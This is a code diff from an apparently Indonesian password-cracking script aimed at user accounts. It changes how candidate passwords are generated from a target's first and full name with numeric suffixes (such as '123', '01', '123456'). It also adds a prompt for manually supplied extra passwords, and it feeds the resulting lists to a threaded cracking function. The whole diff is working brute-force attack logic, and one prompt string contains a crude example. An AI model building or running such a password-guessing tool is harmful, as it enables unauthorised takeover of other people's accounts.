@@ -1216,18 +1216,17 @@ def atur_dulu():
 	else:
 		baz.append('metod1')
 		
-	print(f'{xxx}─────────────────────────────')
-	print('└── tambahkan ua y atau t')
-	uatambah = input(f'└── : ')
-	if uatambah in ['y','Ya','ya','Y']:
-		ualuh.append('ya')
-		print(f'{xxx}─────────────────────────────')
-		bzer = input(f'└── ua : ')
-		ualu.append(bzer)
+	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('>> Masukkan Password Tambahan : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
 	else:
-		ualuh.append('tidak')
+		pwpluss.append('no')
 	passwrd()
-
 ###----------[ BAGIAN PASSWRD ]----------###
 def passwrd():
 	global prog,des
@@ -1242,27 +1241,38 @@ def passwrd():
 				pwv = []
 				pwt = []
 				if len(nmf)<6:
-					if len(frs)<3:
-						pass
-					else:
-						pwv.append(frs+'321')
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
+					pass
 				else:
-					if len(frs)<3:
-						pwv.append(nmf)
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'321')
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-				if '><basari><' in pwt:
-					for xpwn in pwn:
-						pwv.append(xpwn)
+					pwv.append(nmf)
+					pwv.append(frs+'1')
+					pwv.append(frs+'2')
+					pwv.append(frs+'3')
+					pwv.append(frs+'00')
+					pwv.append(frs+'01')
+					pwv.append(frs+'02')
+					pwv.append(frs+'03')
+					pwv.append(frs+'04')
+					pwv.append(frs+'05')
+					pwv.append(frs+'06')
+					pwv.append(frs+'07')
+					pwv.append(frs+'08')
+					pwv.append(frs+'09')
+					pwv.append(frs+'12')
+					pwv.append(frs+'321')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'12')
+					pwv.append(frs+'321')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+			if 'ya' in pwpluss: 
+				for xpwd in pwnya:
+					pwv.append(xpwd)
 				else:pass
 				if 'metod1' in baz:
 					gas_krek.submit(metod1,idf,pwv)
